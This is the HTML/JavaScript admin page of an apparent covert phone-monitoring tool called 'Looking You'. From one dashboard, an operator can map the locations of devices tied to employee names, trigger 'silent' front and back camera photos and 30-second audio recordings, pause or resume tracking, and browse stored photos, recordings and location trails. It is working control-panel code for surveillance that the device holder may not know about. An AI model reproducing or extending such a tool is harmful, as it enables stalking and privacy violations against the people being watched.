<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Looking You | Admin Dashboard</title>
    <link rel="stylesheet" href="style.css">
    <!-- Google Fonts: Outfit -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <!-- Leaflet Map CSS -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
</head>
<body>
    <!-- FontAwesome for Premium Icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <div class="hud-container">
        <!-- 1. The Full-Screen Map Base -->
        <div id="map"></div>

        <!-- 2. Top Bar (Live Focus) -->
        <header class="hud-top-bar glass-panel" id="device-actions" style="display: none;">
            <div class="active-status">
                <div class="monitoring-status" id="tracking-status">
                    <span class="status-dot active"></span>
                    <span class="status-text">Active</span>
                </div>
                <h2 id="active-device-name">No device selected</h2>
            </div>
            
            <div class="top-controls">
                <button id="btn-stop-tracking" onclick="toggleTracking('stop')" class="btn-action danger"><i class="fa-solid fa-pause"></i> Pause Tracking</button>
                <button id="btn-start-tracking" onclick="toggleTracking('start')" class="btn-action success" style="display: none;"><i class="fa-solid fa-play"></i> Resume</button>
            </div>
        </header>

        <!-- 3. Left Panel (Device Manager) -->
        <aside class="hud-left-panel glass-panel">
            <div class="logo">
                <h1>Looking<span>You</span></h1>
                <p>Command Node</p>
            </div>
            
            <div class="status-summary">
                <div class="stat-card">
                    <span class="label">Total Nodes</span>
                    <span class="value" id="total-count">0</span>
                </div>
                <div class="stat-card">
                    <span class="label">Active</span>
                    <span class="value online" id="online-count">0</span>
                </div>
            </div>

            <nav class="device-list">
                <h3>Connected Devices</h3>
                <ul id="devices-ul">
                    <li class="empty-msg">Waiting for signal...</li>
                </ul>
            </nav>
        </aside>

        <!-- 4. Right Panel (Gallery & Settings) -->
        <aside class="hud-right-panel glass-panel">
            <div class="photo-gallery">
                <h3>Live Feed</h3>
                <div id="latest-photo-container">
                    <p class="empty-msg">No visual data</p>
                </div>
            </div>
            <div class="hud-footer">
                <button onclick="logout()" class="btn-logout"><i class="fa-solid fa-power-off"></i> Disconnect</button>
            </div>
        </aside>

        <!-- 5. Bottom Dock (Action Center) -->
        <div class="hud-bottom-dock glass-panel">
            <button onclick="triggerAction('request_location')" class="dock-btn" title="Request Location">
                <i class="fa-solid fa-location-crosshairs"></i>
                <span>Locate</span>
            </button>
            <button onclick="triggerAction('take_photo', 'front')" class="dock-btn" title="Front Photo">
                <i class="fa-solid fa-camera-rotate"></i>
                <span>Front Cam</span>
            </button>
            <button onclick="triggerAction('take_photo', 'back')" class="dock-btn" title="Back Photo">
                <i class="fa-solid fa-camera"></i>
                <span>Back Cam</span>
            </button>
            <button onclick="triggerAction('request_audio', 30)" class="dock-btn warning" title="Record Audio (30s)">
                <i class="fa-solid fa-microphone"></i>
                <span>Record</span>
            </button>
            <div class="dock-divider"></div>
            <button onclick="fetchHistory()" class="dock-btn primary" title="View History">
                <i class="fa-solid fa-server"></i>
                <span>Data Logs</span>
            </button>
        </div>

        <!-- 6. History Overlay Modal -->
        <div id="history-overlay" class="overlay glass-overlay" style="display: none;">
            <div class="panel glass-panel">
                <div class="panel-header">
                    <h3 id="history-title">Device History</h3>
                    <button onclick="closeHistory()" class="btn-close"><i class="fa-solid fa-xmark"></i></button>
                </div>
                <div class="history-tabs">
                    <button class="tab-btn active" onclick="switchHistoryTab(event, 'location')">📍 Locations</button>
                    <button class="tab-btn" onclick="switchHistoryTab(event, 'photo')">📸 Photos</button>
                    <button class="tab-btn" onclick="switchHistoryTab(event, 'audio')">🎙️ Audio</button>
                </div>
                <div id="history-content" class="panel-body">
                    <!-- History items will be loaded here -->
                </div>
            </div>
        </div>
    </div>

    <!-- Scripts -->
    <script src="/socket.io/socket.io.js"></script>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        // --- Security Check ---
        const token = localStorage.getItem('adminToken');
        if (!token) {
            window.location.href = '/login';
        }

        const socket = io();
        let map = L.map('map', { 
            maxZoom: 19,
            zoomControl: false // We will customize controls later if needed
        }).setView([31.5204, 74.3587], 13); // Default to Lahore
        
        // Add zoom control to bottom right
        L.control.zoom({ position: 'bottomright' }).addTo(map);

        // Standard White Map Tile Layer (OpenStreetMap)
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            maxZoom: 19,
            attribution: '&copy; OpenStreetMap contributors'
        }).addTo(map);

        let markers = {};
        let activeDeviceId = null;
        let historyPath = L.polyline([], {color: '#3498db', weight: 4, opacity: 0.7}).addTo(map);
        let historyDots = [];

        // Request initial device list
        socket.emit('list_devices');

        socket.on('devices_data', (devices) => {
            updateDeviceList(devices);
        });

        socket.on('photo_uploaded', (data) => {
            console.log('📸 New photo arrived:', data);
            displayNewPhoto(data);
        });

        socket.on('audio_uploaded', (data) => {
            console.log('🎙️ New audio recording arrived:', data);
            alert(`🎙️ New audio recording received from ${data.deviceId}! Check history to listen.`);
            if (document.getElementById('history-overlay').style.display === 'block') {
                fetchHistory(); // Refresh history to show the player
            }
        });

        socket.on('update_location', (data) => {
            console.log('📍 Received location:', data);
            updateMarker(data);
            updateDeviceStatus(data);
        });

        function updateDeviceList(devices) {
            const ul = document.getElementById('devices-ul');
            ul.innerHTML = '';
            
            document.getElementById('total-count').innerText = devices.length;
            document.getElementById('online-count').innerText = devices.length;

            if (devices.length === 0) {
                ul.innerHTML = '<li class="empty-msg">No devices online</li>';
                return;
            }

            devices.forEach(device => {
                const li = document.createElement('li');
                li.className = 'device-item';
                li.onclick = () => focusDevice(device.deviceId, device.employeeName);
                li.innerHTML = `
                    <div class="info">
                        <span class="name">${device.employeeName}</span>
                        <span class="id">${device.deviceId}</span>
                    </div>
                    <div class="battery">
                        <span class="value">--%</span>
                    </div>
                `;
                li.id = `li-${device.deviceId}`;
                ul.appendChild(li);
            });
        }

        function updateMarker(data) {
            const { deviceId, latitude, longitude } = data;
            
            if (!markers[deviceId]) {
                const icon = L.divIcon({
                    className: 'custom-div-icon',
                    html: "<div style='background-color:#e74c3c;' class='marker-pin'></div><i class='fa fa-user'></i>",
                    iconSize: [30, 42],
                    iconAnchor: [15, 42]
                });
                markers[deviceId] = L.marker([latitude, longitude]).addTo(map);
                markers[deviceId].bindPopup(`<b>${deviceId}</b>`).openPopup();
            } else {
                markers[deviceId].setLatLng([latitude, longitude]);
            }

            // Extend path if this is the active device
            if (activeDeviceId === deviceId) {
                historyPath.addLatLng([latitude, longitude]);
                map.panTo([latitude, longitude]);
            }
        }

        function updateDeviceStatus(data) {
            const li = document.getElementById(`li-${data.deviceId}`);
            if (li) {
                const batteryVal = li.querySelector('.battery .value');
                batteryVal.innerText = `${data.batteryLevel}%`;
                
                if (data.isCharging) {
                    li.classList.add('charging');
                } else {
                    li.classList.remove('charging');
                }
            }
        }

        function focusDevice(id, name) {
            activeDeviceId = id;
            document.getElementById('active-device-name').innerText = name;
            document.getElementById('device-actions').style.display = 'flex';
            
            clearPaths(); // Clear old paths when switching
            
            if (markers[id]) {
                map.setView(markers[id].getLatLng(), 18);
            }
        }

        function clearPaths() {
            historyPath.setLatLngs([]);
            historyDots.forEach(dot => map.removeLayer(dot));
            historyDots = [];
        }

        function triggerAction(action, param) {
            if (!activeDeviceId) return;
            console.log(`🚀 Triggering ${action} for ${activeDeviceId}`);
            
            if (action === 'take_photo') {
                socket.emit('trigger_photo', { deviceId: activeDeviceId, camera: param });
                // Show a loading/waiting state
                const container = document.getElementById('latest-photo-container');
                container.innerHTML = `<div class="loading">Capturing silent photo...</div>`;
            } else if (action === 'request_location') {
                socket.emit('request_current_location', { deviceId: activeDeviceId });
            } else if (action === 'request_audio') {
                socket.emit('trigger_audio', { deviceId: activeDeviceId, duration: param || 30 });
                alert(`🎙️ Requesting ${param || 30}s audio recording...`);
            }
        }

        function toggleTracking(action) {
            if (!activeDeviceId) return;
            console.log(`📡 Sending remote control: ${action} for ${activeDeviceId}`);
            socket.emit('toggle_tracking', { deviceId: activeDeviceId, action: action });
            
            // Update UI
            const statusText = document.querySelector('#tracking-status .status-text');
            const statusDot = document.querySelector('#tracking-status .status-dot');
            const btnStart = document.getElementById('btn-start-tracking');
            const btnStop = document.getElementById('btn-stop-tracking');

            if (action === 'stop') {
                statusText.innerText = 'Paused';
                statusDot.classList.remove('active');
                btnStart.style.display = 'block';
                btnStop.style.display = 'none';
            } else {
                statusText.innerText = 'Active';
                statusDot.classList.add('active');
                btnStart.style.display = 'none';
                btnStop.style.display = 'block';
            }
        }

        function displayNewPhoto(data) {
            const container = document.getElementById('latest-photo-container');
            container.innerHTML = `
                <div class="photo-card fade-in">
                    <img src="${data.url}" alt="Capture" onclick="window.open('${data.url}', '_blank')">
                    <div class="photo-info">
                        <span>ID: ${data.deviceId}</span>
                        <span>${data.timestamp}</span>
                    </div>
                </div>
            `;
            // Also refresh history if open
            if (document.getElementById('history-overlay').style.display === 'block') {
                fetchHistory();
            }
        }

        async function fetchHistory() {
            if (!activeDeviceId) return;
            const container = document.getElementById('history-content');
            container.innerHTML = '<div class="loading">Fetching records...</div>';
            document.getElementById('history-overlay').style.display = 'flex';
            document.getElementById('history-title').innerText = `History: ${activeDeviceId}`;

            // Reset tabs to default (Location)
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.querySelector('.tab-btn').classList.add('active'); // First button

            try {
                const response = await fetch(`/api/history/${activeDeviceId}`, {
                    headers: { 'Authorization': `Bearer ${localStorage.getItem('adminToken')}` }
                });
                
                if (response.status === 401) return logout();
                const data = await response.json();
                
                if (data.length === 0) {
                    container.innerHTML = '<p class="empty-msg">No logs found for this device</p>';
                    return;
                }

                // Visualize path on map
                drawHistoryPath(data);

                // Group data by type
                const locLogs = data.filter(l => l.logType === 'location');
                const photoLogs = data.filter(l => l.logType === 'photo');
                const audioLogs = data.filter(l => l.logType === 'audio');

                container.innerHTML = `
                    <div class="tab-pane active" id="pane-location">
                        ${locLogs.length > 0 ? locLogs.map(buildLogHtml).join('') : '<p class="empty-msg">No location records</p>'}
                    </div>
                    <div class="tab-pane" id="pane-photo">
                        ${photoLogs.length > 0 ? photoLogs.map(buildLogHtml).join('') : '<p class="empty-msg">No photos found</p>'}
                    </div>
                    <div class="tab-pane" id="pane-audio">
                        ${audioLogs.length > 0 ? audioLogs.map(buildLogHtml).join('') : '<p class="empty-msg">No audio recordings</p>'}
                    </div>
                `;
            } catch (err) {
                container.innerHTML = '<p class="error empty-msg">Failed to load history</p>';
            }
        }

        function buildLogHtml(log) {
            return `
                <div class="history-item ${log.logType}">
                    <div class="item-meta">
                        <div>
                            <span class="type-badge type-${log.logType}">${log.logType.toUpperCase()}</span>
                            <span class="time">${new Date(log.createdAt).toLocaleString()}</span>
                        </div>
                        <button onclick="deleteLog(${log.id})" class="btn-delete"><i class="fa-solid fa-trash"></i></button>
                    </div>
                    ${log.logType === 'photo' ? `<img src="${log.url}" class="history-img" onclick="window.open('${log.url}', '_blank')">` : ''}
                    ${log.logType === 'audio' ? `
                        <div class="audio-player-box">
                            <span>🎙️ Audio Recording</span>
                            <audio controls>
                                <source src="${log.url}" type="audio/mp4">
                                <source src="${log.url}" type="audio/mpeg">
                            </audio>
                        </div>` : ''}
                    <div class="item-details">
                        ${log.logType === 'location' ? `<i class="fa-solid fa-location-dot"></i> ${log.latitude}, ${log.longitude}` : ''}
                        ${log.batteryLevel ? ` &nbsp;|&nbsp; <i class="fa-solid fa-battery-half"></i> ${log.batteryLevel}%` : ''}
                    </div>
                </div>
            `;
        }

        function switchHistoryTab(event, tabName) {
            document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            
            const pane = document.getElementById(`pane-${tabName}`);
            if (pane) pane.classList.add('active');
            
            if (event && event.currentTarget) {
                event.currentTarget.classList.add('active');
            }
        }

        function drawHistoryPath(logs) {
            clearPaths();
            const locationLogs = logs.filter(log => log.logType === 'location').reverse(); // Oldest to newest
            
            const latlngs = locationLogs.map(log => [log.latitude, log.longitude]);
            historyPath.setLatLngs(latlngs);

            locationLogs.forEach(log => {
                const dot = L.circleMarker([log.latitude, log.longitude], {
                    radius: 4,
                    color: '#2980b9',
                    fillColor: '#3498db',
                    fillOpacity: 1
                }).addTo(map);
                dot.bindPopup(`Time: ${new Date(log.createdAt).toLocaleString()}`);
                historyDots.push(dot);
            });

            if (latlngs.length > 0) {
                map.fitBounds(historyPath.getBounds(), {padding: [50, 50]});
            }
        }

        async function deleteLog(id) {
            if (!confirm('Are you sure you want to delete this record?')) return;
            try {
                const response = await fetch(`/api/history/${id}`, { 
                    method: 'DELETE',
                    headers: { 'Authorization': `Bearer ${localStorage.getItem('adminToken')}` }
                });
                if (response.status === 401) return logout();
                if (response.ok) {
                    fetchHistory(); // Refresh
                }
            } catch (err) {
                alert('Failed to delete');
            }
        }

        function logout() {
            localStorage.removeItem('adminToken');
            localStorage.removeItem('adminInfo');
            window.location.href = '/login';
        }

        function closeHistory() {
            document.getElementById('history-overlay').style.display = 'none';
            // Optional: clear paths when closing history to keep live view clean
            // clearPaths(); 
        }
    </script>
</body>
</html>
